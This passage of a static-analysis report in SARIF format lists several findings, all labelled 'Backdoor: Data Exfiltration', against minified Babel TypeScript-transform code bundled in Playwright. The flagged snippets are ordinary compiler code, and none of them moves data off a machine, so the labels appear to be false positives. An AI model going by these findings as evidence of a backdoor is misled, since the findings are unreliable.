                    "text": "RestElement:m,Program:{enter(d,y){let{file:v}=y,I=null,D=null,O=d.scope;if(zn.GLOBAL_TYPES.has(O)||zn.GLOBAL_TYPES.set(O,new Set),v.ast.comments)for(let R of v.ast.comments){let K=s.exec(R.value);K&&(K[1]?D=K[2]:I=K[2])}let _=I||a;_&&([_]=_.split(\".\"));let F=D||o;F&&([F]=F.split(\".\"));for(let R of d.get(\"body\")){if(R.isImportDeclaration()){if(Gr.has(y.file.ast.program)||Gr.set(y.file.ast.program,!0),R.node.importKind===\"type\"){for(let Te of R.node.specifiers)(0,zn.registerGlobalType)(O,Te.local.name);R.remove();continue}let K=new Set,te=R.node.specifiers.length,se=()=>te>0&&te===K.size;for(let Te o",
                    "rendered": {
                      "text": "RestElement:m,Program:{enter(d,y){let{file:v}=y,I=null,D=null,O=d.scope;if(zn.GLOBAL_TYPES.has(O)||zn.GLOBAL_TYPES.set(O,new Set),v.ast.comments)for(let R of v.ast.comments){let K=s.exec(R.value);K&&(K[1]?D=K[2]:I=K[2])}let _=I||a;_&&([_]=_.split(\".\"));let F=D||o;F&&([F]=F.split(\".\"));for(let R of d.get(\"body\")){if(R.isImportDeclaration()){if(Gr.has(y.file.ast.program)||Gr.set(y.file.ast.program,!0),R.node.importKind===\"type\"){for(let Te of R.node.specifiers)(0,zn.registerGlobalType)(O,Te.local.name);R.remove();continue}let K=new Set,te=R.node.specifiers.length,se=()=>te>0&&te===K.size;for(let Te o",
                      "markdown": "`RestElement:m,Program:{enter(d,y){let{file:v}=y,I=null,D=null,O=d.scope;if(zn.GLOBAL_TYPES.has(O)||zn.GLOBAL_TYPES.set(O,new Set),v.ast.comments)for(let R of v.ast.comments){let K=s.exec(R.value);K&&(K[1]?D=K[2]:I=K[2])}let _=I||a;_&&([_]=_.split(\".\"));let F=D||o;F&&([F]=F.split(\".\"));for(let R of d.get(\"body\")){if(R.isImportDeclaration()){if(Gr.has(y.file.ast.program)||Gr.set(y.file.ast.program,!0),R.node.importKind===\"type\"){for(let Te of R.node.specifiers)(0,zn.registerGlobalType)(O,Te.local.name);R.remove();continue}let K=new Set,te=R.node.specifiers.length,se=()=>te>0&&te===K.size;for(let Te o`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1921,
                  "startColumn": 30,
                  "endLine": 1921,
                  "endColumn": 35,
                  "snippet": {
                    "text": "let F;if(r.isIdentifier(_))F=_;else if(r.isAssignmentPattern(_)&&r.isIdentifier(_.left))F=_.left;else throw D.buildCodeFrameError(\"Parameter properties can not be destructuring patterns.\");v.push(n.statement.ast`\n              this.${r.cloneNode(F)} = ${r.cloneNode(F)}\n            `),D.replaceWith(D.get(\"parameter\")),I.registerBinding(\"param\",D)}}(0,u1e.injectInitialization)(y,d,v)}};return{name:\"transform-typescript\",inherits:l1e.default,visitor:{Pattern:m,Identifier:m,RestElement:m,Program:{enter(d,y){let{file:v}=y,I=null,D=null,O=d.scope;if(zn.GLOBAL_TYPES.has(O)||zn.GLOBAL_TYPES.set(O,new Set),",
                    "rendered": {
                      "text": "let F;if(r.isIdentifier(_))F=_;else if(r.isAssignmentPattern(_)&&r.isIdentifier(_.left))F=_.left;else throw D.buildCodeFrameError(\"Parameter properties can not be destructuring patterns.\");v.push(n.statement.ast`\n              this.${r.cloneNode(F)} = ${r.cloneNode(F)}\n            `),D.replaceWith(D.get(\"parameter\")),I.registerBinding(\"param\",D)}}(0,u1e.injectInitialization)(y,d,v)}};return{name:\"transform-typescript\",inherits:l1e.default,visitor:{Pattern:m,Identifier:m,RestElement:m,Program:{enter(d,y){let{file:v}=y,I=null,D=null,O=d.scope;if(zn.GLOBAL_TYPES.has(O)||zn.GLOBAL_TYPES.set(O,new Set),",
                      "markdown": "`let F;if(r.isIdentifier(_))F=_;else if(r.isAssignmentPattern(_)&&r.isIdentifier(_.left))F=_.left;else throw D.buildCodeFrameError(\"Parameter properties can not be destructuring patterns.\");v.push(n.statement.ast`\n              this.${r.cloneNode(F)} = ${r.cloneNode(F)}\n            `),D.replaceWith(D.get(\"parameter\")),I.registerBinding(\"param\",D)}}(0,u1e.injectInitialization)(y,d,v)}};return{name:\"transform-typescript\",inherits:l1e.default,visitor:{Pattern:m,Identifier:m,RestElement:m,Program:{enter(d,y){let{file:v}=y,I=null,D=null,O=d.scope;if(zn.GLOBAL_TYPES.has(O)||zn.GLOBAL_TYPES.set(O,new Set),`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1919,
                  "startColumn": 1619,
                  "endLine": 1919,
                  "endColumn": 1624,
                  "snippet": {
                    "text": "&&(y.declare=null),y.override&&(y.override=null)},method({node:d}){d.accessibility&&(d.accessibility=null),d.abstract&&(d.abstract=null),d.optional&&(d.optional=null),d.override&&(d.override=null)},constructor(d,y){d.node.accessibility&&(d.node.accessibility=null);let v=[],{scope:I}=d;for(let D of d.get(\"params\")){let O=D.node;if(O.type===\"TSParameterProperty\"){let _=O.parameter;if(y_.has(_))continue;y_.add(_);let F;if(r.isIdentifier(_))F=_;else if(r.isAssignmentPattern(_)&&r.isIdentifier(_.left))F=_.left;else throw D.buildCodeFrameError(\"Parameter properties can not be destructuring patterns.\");v.",
                    "rendered": {
                      "text": "&&(y.declare=null),y.override&&(y.override=null)},method({node:d}){d.accessibility&&(d.accessibility=null),d.abstract&&(d.abstract=null),d.optional&&(d.optional=null),d.override&&(d.override=null)},constructor(d,y){d.node.accessibility&&(d.node.accessibility=null);let v=[],{scope:I}=d;for(let D of d.get(\"params\")){let O=D.node;if(O.type===\"TSParameterProperty\"){let _=O.parameter;if(y_.has(_))continue;y_.add(_);let F;if(r.isIdentifier(_))F=_;else if(r.isAssignmentPattern(_)&&r.isIdentifier(_.left))F=_.left;else throw D.buildCodeFrameError(\"Parameter properties can not be destructuring patterns.\");v.",
                      "markdown": "`&&(y.declare=null),y.override&&(y.override=null)},method({node:d}){d.accessibility&&(d.accessibility=null),d.abstract&&(d.abstract=null),d.optional&&(d.optional=null),d.override&&(d.override=null)},constructor(d,y){d.node.accessibility&&(d.node.accessibility=null);let v=[],{scope:I}=d;for(let D of d.get(\"params\")){let O=D.node;if(O.type===\"TSParameterProperty\"){let _=O.parameter;if(y_.has(_))continue;y_.add(_);let F;if(r.isIdentifier(_))F=_;else if(r.isAssignmentPattern(_)&&r.isIdentifier(_.left))F=_.left;else throw D.buildCodeFrameError(\"Parameter properties can not be destructuring patterns.\");v.`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1918,
                  "startColumn": 796,
                  "endLine": 1918,
                  "endColumn": 801,
                  "snippet": {
                    "text": "ind===\"type\";default:return!1}}var Gr=new WeakMap,y_=new WeakSet;function ip(e){let t=e.getBindingIdentifiers();for(let r of Object.keys(t)){let n=e.scope.getBinding(r);n&&n.identifier===t[r]&&n.scope.removeBinding(r)}e.opts.noScope=!0,e.remove(),e.opts.noScope=!1}function g_(e,t,r,n,s=\"\"){if(t.file.get(\"@babel/plugin-transform-modules-*\")!==\"commonjs\")throw e.buildCodeFrameError(`\\`${r}\\` is only supported when compiling modules to CommonJS.\nPlease consider using \\`${n}\\`${s}, or add @babel/plugin-transform-modules-commonjs to your Babel config.`)}var PIe=ap.default=(0,o1e.declare)((e,t)=>{let{typ",
                    "rendered": {
                      "text": "ind===\"type\";default:return!1}}var Gr=new WeakMap,y_=new WeakSet;function ip(e){let t=e.getBindingIdentifiers();for(let r of Object.keys(t)){let n=e.scope.getBinding(r);n&&n.identifier===t[r]&&n.scope.removeBinding(r)}e.opts.noScope=!0,e.remove(),e.opts.noScope=!1}function g_(e,t,r,n,s=\"\"){if(t.file.get(\"@babel/plugin-transform-modules-*\")!==\"commonjs\")throw e.buildCodeFrameError(`\\`${r}\\` is only supported when compiling modules to CommonJS.\nPlease consider using \\`${n}\\`${s}, or add @babel/plugin-transform-modules-commonjs to your Babel config.`)}var PIe=ap.default=(0,o1e.declare)((e,t)=>{let{typ",
                      "markdown": "`ind===\"type\";default:return!1}}var Gr=new WeakMap,y_=new WeakSet;function ip(e){let t=e.getBindingIdentifiers();for(let r of Object.keys(t)){let n=e.scope.getBinding(r);n&&n.identifier===t[r]&&n.scope.removeBinding(r)}e.opts.noScope=!0,e.remove(),e.opts.noScope=!1}function g_(e,t,r,n,s=\"\"){if(t.file.get(\"@babel/plugin-transform-modules-*\")!==\"commonjs\")throw e.buildCodeFrameError(`\\`${r}\\` is only supported when compiling modules to CommonJS.\nPlease consider using \\`${n}\\`${s}, or add @babel/plugin-transform-modules-commonjs to your Babel config.`)}var PIe=ap.default=(0,o1e.declare)((e,t)=>{let{typ`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1911,
                  "startColumn": 333,
                  "endLine": 1911,
                  "endColumn": 338,
                  "snippet": {
                    "text": "e.registerDeclaration(declarationPath)\".`),!1)}function n1e(e,t){d_.get(e).add(t)}});var m_=E(HE=>{\"use strict\";Object.defineProperty(HE,\"__esModule\",{value:!0});HE.default=i1e;var ot=Et(),s1e=$E();function i1e(e,t){if(e.node.declare||e.node.id.type===\"StringLiteral\"){e.remove();return}if(!t)throw e.get(\"id\").buildCodeFrameError(\"Namespace not marked type-only declare. Non-declarative namespaces are only supported experimentally in Babel. To enable and review caveats see: https://babeljs.io/docs/en/babel-plugin-transform-typescript\");let r=e.node.id.name,n=GE(e,ot.types.cloneNode(e.node,!0));if(n==",
                    "rendered": {
                      "text": "e.registerDeclaration(declarationPath)\".`),!1)}function n1e(e,t){d_.get(e).add(t)}});var m_=E(HE=>{\"use strict\";Object.defineProperty(HE,\"__esModule\",{value:!0});HE.default=i1e;var ot=Et(),s1e=$E();function i1e(e,t){if(e.node.declare||e.node.id.type===\"StringLiteral\"){e.remove();return}if(!t)throw e.get(\"id\").buildCodeFrameError(\"Namespace not marked type-only declare. Non-declarative namespaces are only supported experimentally in Babel. To enable and review caveats see: https://babeljs.io/docs/en/babel-plugin-transform-typescript\");let r=e.node.id.name,n=GE(e,ot.types.cloneNode(e.node,!0));if(n==",
                      "markdown": "`e.registerDeclaration(declarationPath)\".`),!1)}function n1e(e,t){d_.get(e).add(t)}});var m_=E(HE=>{\"use strict\";Object.defineProperty(HE,\"__esModule\",{value:!0});HE.default=i1e;var ot=Et(),s1e=$E();function i1e(e,t){if(e.node.declare||e.node.id.type===\"StringLiteral\"){e.remove();return}if(!t)throw e.get(\"id\").buildCodeFrameError(\"Namespace not marked type-only declare. Non-declarative namespaces are only supported experimentally in Babel. To enable and review caveats see: https://babeljs.io/docs/en/babel-plugin-transform-typescript\");let r=e.node.id.name,n=GE(e,ot.types.cloneNode(e.node,!0));if(n==`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1911,
                  "startColumn": 100,
                  "endLine": 1911,
                  "endColumn": 105,
                  "snippet": {
                    "text": "Script type declaration.\nIt will be treated as a JavaScript value.\n\nThis problem is likely caused by another plugin injecting\n\"${t}\" without registering it in the scope tracker. If you are the author\n of that plugin, please use \"scope.registerDeclaration(declarationPath)\".`),!1)}function n1e(e,t){d_.get(e).add(t)}});var m_=E(HE=>{\"use strict\";Object.defineProperty(HE,\"__esModule\",{value:!0});HE.default=i1e;var ot=Et(),s1e=$E();function i1e(e,t){if(e.node.declare||e.node.id.type===\"StringLiteral\"){e.remove();return}if(!t)throw e.get(\"id\").buildCodeFrameError(\"Namespace not marked type-only declare. ",
                    "rendered": {
                      "text": "Script type declaration.\nIt will be treated as a JavaScript value.\n\nThis problem is likely caused by another plugin injecting\n\"${t}\" without registering it in the scope tracker. If you are the author\n of that plugin, please use \"scope.registerDeclaration(declarationPath)\".`),!1)}function n1e(e,t){d_.get(e).add(t)}});var m_=E(HE=>{\"use strict\";Object.defineProperty(HE,\"__esModule\",{value:!0});HE.default=i1e;var ot=Et(),s1e=$E();function i1e(e,t){if(e.node.declare||e.node.id.type===\"StringLiteral\"){e.remove();return}if(!t)throw e.get(\"id\").buildCodeFrameError(\"Namespace not marked type-only declare. ",
                      "markdown": "`Script type declaration.\nIt will be treated as a JavaScript value.\n\nThis problem is likely caused by another plugin injecting\n\"${t}\" without registering it in the scope tracker. If you are the author\n of that plugin, please use \"scope.registerDeclaration(declarationPath)\".`),!1)}function n1e(e,t){d_.get(e).add(t)}});var m_=E(HE=>{\"use strict\";Object.defineProperty(HE,\"__esModule\",{value:!0});HE.default=i1e;var ot=Et(),s1e=$E();function i1e(e,t){if(e.node.declare||e.node.id.type===\"StringLiteral\"){e.remove();return}if(!t)throw e.get(\"id\").buildCodeFrameError(\"Namespace not marked type-only declare. `"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1904,
                  "startColumn": 4545,
                  "endLine": 1904,
                  "endColumn": 4550,
                  "snippet": {
                    "text": ";a.has(l)&&o.replaceWith(t.cloneNode(a.get(l)))}}),e.remove()}});var $E=E(_a=>{\"use strict\";Object.defineProperty(_a,\"__esModule\",{value:!0});_a.GLOBAL_TYPES=void 0;_a.isGlobalType=r1e;_a.registerGlobalType=n1e;var d_=_a.GLOBAL_TYPES=new WeakMap;function r1e({scope:e},t){return e.hasBinding(t)?!1:d_.get(e).has(t)?!0:(console.warn(`The exported identifier \"${t}\" is not declared in Babel's scope tracker\nas a JavaScript value binding, and \"@babel/plugin-transform-typescript\"\nnever encountered it as a TypeScript type declaration.\nIt will be treated as a JavaScript value.\n\nThis problem is likely caused ",
                    "rendered": {
                      "text": ";a.has(l)&&o.replaceWith(t.cloneNode(a.get(l)))}}),e.remove()}});var $E=E(_a=>{\"use strict\";Object.defineProperty(_a,\"__esModule\",{value:!0});_a.GLOBAL_TYPES=void 0;_a.isGlobalType=r1e;_a.registerGlobalType=n1e;var d_=_a.GLOBAL_TYPES=new WeakMap;function r1e({scope:e},t){return e.hasBinding(t)?!1:d_.get(e).has(t)?!0:(console.warn(`The exported identifier \"${t}\" is not declared in Babel's scope tracker\nas a JavaScript value binding, and \"@babel/plugin-transform-typescript\"\nnever encountered it as a TypeScript type declaration.\nIt will be treated as a JavaScript value.\n\nThis problem is likely caused ",
                      "markdown": "`;a.has(l)&&o.replaceWith(t.cloneNode(a.get(l)))}}),e.remove()}});var $E=E(_a=>{\"use strict\";Object.defineProperty(_a,\"__esModule\",{value:!0});_a.GLOBAL_TYPES=void 0;_a.isGlobalType=r1e;_a.registerGlobalType=n1e;var d_=_a.GLOBAL_TYPES=new WeakMap;function r1e({scope:e},t){return e.hasBinding(t)?!1:d_.get(e).has(t)?!0:(console.warn(`The exported identifier \"${t}\" is not declared in Babel's scope tracker\nas a JavaScript value binding, and \"@babel/plugin-transform-typescript\"\nnever encountered it as a TypeScript type declaration.\nIt will be treated as a JavaScript value.\n\nThis problem is likely caused `"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1904,
                  "startColumn": 4283,
                  "endLine": 1904,
                  "endColumn": 4288,
                  "snippet": {
                    "text": "ding(r)&&o.skip()},MemberExpression(o){if(!t.isIdentifier(o.node.object,{name:r}))return;let l;if(o.node.computed)if(t.isStringLiteral(o.node.property))l=o.node.property.value;else return;else if(t.isIdentifier(o.node.property))l=o.node.property.name;else return;a.has(l)&&o.replaceWith(t.cloneNode(a.get(l)))}}),e.remove()}});var $E=E(_a=>{\"use strict\";Object.defineProperty(_a,\"__esModule\",{value:!0});_a.GLOBAL_TYPES=void 0;_a.isGlobalType=r1e;_a.registerGlobalType=n1e;var d_=_a.GLOBAL_TYPES=new WeakMap;function r1e({scope:e},t){return e.hasBinding(t)?!1:d_.get(e).has(t)?!0:(console.warn(`The export",
                    "rendered": {
                      "text": "ding(r)&&o.skip()},MemberExpression(o){if(!t.isIdentifier(o.node.object,{name:r}))return;let l;if(o.node.computed)if(t.isStringLiteral(o.node.property))l=o.node.property.value;else return;else if(t.isIdentifier(o.node.property))l=o.node.property.name;else return;a.has(l)&&o.replaceWith(t.cloneNode(a.get(l)))}}),e.remove()}});var $E=E(_a=>{\"use strict\";Object.defineProperty(_a,\"__esModule\",{value:!0});_a.GLOBAL_TYPES=void 0;_a.isGlobalType=r1e;_a.registerGlobalType=n1e;var d_=_a.GLOBAL_TYPES=new WeakMap;function r1e({scope:e},t){return e.hasBinding(t)?!1:d_.get(e).has(t)?!0:(console.warn(`The export",
                      "markdown": "`ding(r)&&o.skip()},MemberExpression(o){if(!t.isIdentifier(o.node.object,{name:r}))return;let l;if(o.node.computed)if(t.isStringLiteral(o.node.property))l=o.node.property.value;else return;else if(t.isIdentifier(o.node.property))l=o.node.property.name;else return;a.has(l)&&o.replaceWith(t.cloneNode(a.get(l)))}}),e.remove()}});var $E=E(_a=>{\"use strict\";Object.defineProperty(_a,\"__esModule\",{value:!0});_a.GLOBAL_TYPES=void 0;_a.isGlobalType=r1e;_a.registerGlobalType=n1e;var d_=_a.GLOBAL_TYPES=new WeakMap;function r1e({scope:e},t){return e.hasBinding(t)?!1:d_.get(e).has(t)?!0:(console.warn(`The export`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1904,
                  "startColumn": 2726,
                  "endLine": 1904,
                  "endColumn": 2731,
                  "snippet": {
                    "text": " 0?f:u.has(o.node)?void 0:(u.add(o.node),f=f_(o.resolve(),l,u),l==null||l.set(c,f),f)}}function i(o){let l=n(o.get(\"argument\"));if(l!==void 0)switch(o.node.operator){case\"+\":return l;case\"-\":return-l;case\"~\":return~l;default:return}}function a(o){let l=n(o.get(\"left\"));if(l===void 0)return;let u=n(o.get(\"right\"));if(u!==void 0)switch(o.node.operator){case\"|\":return l|u;case\"&\":return l&u;case\">>\":return l>>u;case\">>>\":return l>>>u;case\"<<\":return l<<u;case\"^\":return l^u;case\"*\":return l*u;case\"/\":return l/u;case\"+\":return l+u;case\"-\":return l-u;case\"%\":return l%u;case\"**\":return Math.pow(l,u);defau",
                    "rendered": {
                      "text": " 0?f:u.has(o.node)?void 0:(u.add(o.node),f=f_(o.resolve(),l,u),l==null||l.set(c,f),f)}}function i(o){let l=n(o.get(\"argument\"));if(l!==void 0)switch(o.node.operator){case\"+\":return l;case\"-\":return-l;case\"~\":return~l;default:return}}function a(o){let l=n(o.get(\"left\"));if(l===void 0)return;let u=n(o.get(\"right\"));if(u!==void 0)switch(o.node.operator){case\"|\":return l|u;case\"&\":return l&u;case\">>\":return l>>u;case\">>>\":return l>>>u;case\"<<\":return l<<u;case\"^\":return l^u;case\"*\":return l*u;case\"/\":return l/u;case\"+\":return l+u;case\"-\":return l-u;case\"%\":return l%u;case\"**\":return Math.pow(l,u);defau",
                      "markdown": "` 0?f:u.has(o.node)?void 0:(u.add(o.node),f=f_(o.resolve(),l,u),l==null||l.set(c,f),f)}}function i(o){let l=n(o.get(\"argument\"));if(l!==void 0)switch(o.node.operator){case\"+\":return l;case\"-\":return-l;case\"~\":return~l;default:return}}function a(o){let l=n(o.get(\"left\"));if(l===void 0)return;let u=n(o.get(\"right\"));if(u!==void 0)switch(o.node.operator){case\"|\":return l|u;case\"&\":return l&u;case\">>\":return l>>u;case\">>>\":return l>>>u;case\"<<\":return l<<u;case\"^\":return l^u;case\"*\":return l*u;case\"/\":return l/u;case\"+\":return l+u;case\"-\":return l-u;case\"%\":return l%u;case\"**\":return Math.pow(l,u);defau`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1904,
                  "startColumn": 2682,
                  "endLine": 1904,
                  "endColumn": 2687,
                  "snippet": {
                    "text": "et f=l==null?void 0:l.get(c);return f!==void 0?f:u.has(o.node)?void 0:(u.add(o.node),f=f_(o.resolve(),l,u),l==null||l.set(c,f),f)}}function i(o){let l=n(o.get(\"argument\"));if(l!==void 0)switch(o.node.operator){case\"+\":return l;case\"-\":return-l;case\"~\":return~l;default:return}}function a(o){let l=n(o.get(\"left\"));if(l===void 0)return;let u=n(o.get(\"right\"));if(u!==void 0)switch(o.node.operator){case\"|\":return l|u;case\"&\":return l&u;case\">>\":return l>>u;case\">>>\":return l>>>u;case\"<<\":return l<<u;case\"^\":return l^u;case\"*\":return l*u;case\"/\":return l/u;case\"+\":return l+u;case\"-\":return l-u;case\"%\":re",
                    "rendered": {
                      "text": "et f=l==null?void 0:l.get(c);return f!==void 0?f:u.has(o.node)?void 0:(u.add(o.node),f=f_(o.resolve(),l,u),l==null||l.set(c,f),f)}}function i(o){let l=n(o.get(\"argument\"));if(l!==void 0)switch(o.node.operator){case\"+\":return l;case\"-\":return-l;case\"~\":return~l;default:return}}function a(o){let l=n(o.get(\"left\"));if(l===void 0)return;let u=n(o.get(\"right\"));if(u!==void 0)switch(o.node.operator){case\"|\":return l|u;case\"&\":return l&u;case\">>\":return l>>u;case\">>>\":return l>>>u;case\"<<\":return l<<u;case\"^\":return l^u;case\"*\":return l*u;case\"/\":return l/u;case\"+\":return l+u;case\"-\":return l-u;case\"%\":re",
                      "markdown": "`et f=l==null?void 0:l.get(c);return f!==void 0?f:u.has(o.node)?void 0:(u.add(o.node),f=f_(o.resolve(),l,u),l==null||l.set(c,f),f)}}function i(o){let l=n(o.get(\"argument\"));if(l!==void 0)switch(o.node.operator){case\"+\":return l;case\"-\":return-l;case\"~\":return~l;default:return}}function a(o){let l=n(o.get(\"left\"));if(l===void 0)return;let u=n(o.get(\"right\"));if(u!==void 0)switch(o.node.operator){case\"|\":return l|u;case\"&\":return l&u;case\">>\":return l>>u;case\">>>\":return l>>>u;case\"<<\":return l<<u;case\"^\":return l^u;case\"*\":return l*u;case\"/\":return l/u;case\"+\":return l+u;case\"-\":return l-u;case\"%\":re`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1904,
                  "startColumn": 2536,
                  "endLine": 1904,
                  "endColumn": 2541,
                  "snippet": {
                    "text": ";return b?b.get(p.computed?p.value:p.name):void 0}else if(o.isIdentifier()){let c=o.node.name;if([\"Infinity\",\"NaN\"].includes(c))return Number(c);let f=l==null?void 0:l.get(c);return f!==void 0?f:u.has(o.node)?void 0:(u.add(o.node),f=f_(o.resolve(),l,u),l==null||l.set(c,f),f)}}function i(o){let l=n(o.get(\"argument\"));if(l!==void 0)switch(o.node.operator){case\"+\":return l;case\"-\":return-l;case\"~\":return~l;default:return}}function a(o){let l=n(o.get(\"left\"));if(l===void 0)return;let u=n(o.get(\"right\"));if(u!==void 0)switch(o.node.operator){case\"|\":return l|u;case\"&\":return l&u;case\">>\":return l>>u;cas",
                    "rendered": {
                      "text": ";return b?b.get(p.computed?p.value:p.name):void 0}else if(o.isIdentifier()){let c=o.node.name;if([\"Infinity\",\"NaN\"].includes(c))return Number(c);let f=l==null?void 0:l.get(c);return f!==void 0?f:u.has(o.node)?void 0:(u.add(o.node),f=f_(o.resolve(),l,u),l==null||l.set(c,f),f)}}function i(o){let l=n(o.get(\"argument\"));if(l!==void 0)switch(o.node.operator){case\"+\":return l;case\"-\":return-l;case\"~\":return~l;default:return}}function a(o){let l=n(o.get(\"left\"));if(l===void 0)return;let u=n(o.get(\"right\"));if(u!==void 0)switch(o.node.operator){case\"|\":return l|u;case\"&\":return l&u;case\">>\":return l>>u;cas",
                      "markdown": "`;return b?b.get(p.computed?p.value:p.name):void 0}else if(o.isIdentifier()){let c=o.node.name;if([\"Infinity\",\"NaN\"].includes(c))return Number(c);let f=l==null?void 0:l.get(c);return f!==void 0?f:u.has(o.node)?void 0:(u.add(o.node),f=f_(o.resolve(),l,u),l==null||l.set(c,f),f)}}function i(o){let l=n(o.get(\"argument\"));if(l!==void 0)switch(o.node.operator){case\"+\":return l;case\"-\":return-l;case\"~\":return~l;default:return}}function a(o){let l=n(o.get(\"left\"));if(l===void 0)return;let u=n(o.get(\"right\"));if(u!==void 0)switch(o.node.operator){case\"|\":return l|u;case\"&\":return l&u;case\">>\":return l>>u;cas`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1904,
                  "startColumn": 2403,
                  "endLine": 1904,
                  "endColumn": 2408,
                  "snippet": {
                    "text": "f)||(c.computed?!Oa.types.isStringLiteral(p):!Oa.types.isIdentifier(p)))return;let m=o.scope.getBindingIdentifier(f.name),b=qE.get(m);return b?b.get(p.computed?p.value:p.name):void 0}else if(o.isIdentifier()){let c=o.node.name;if([\"Infinity\",\"NaN\"].includes(c))return Number(c);let f=l==null?void 0:l.get(c);return f!==void 0?f:u.has(o.node)?void 0:(u.add(o.node),f=f_(o.resolve(),l,u),l==null||l.set(c,f),f)}}function i(o){let l=n(o.get(\"argument\"));if(l!==void 0)switch(o.node.operator){case\"+\":return l;case\"-\":return-l;case\"~\":return~l;default:return}}function a(o){let l=n(o.get(\"left\"));if(l===void ",
                    "rendered": {
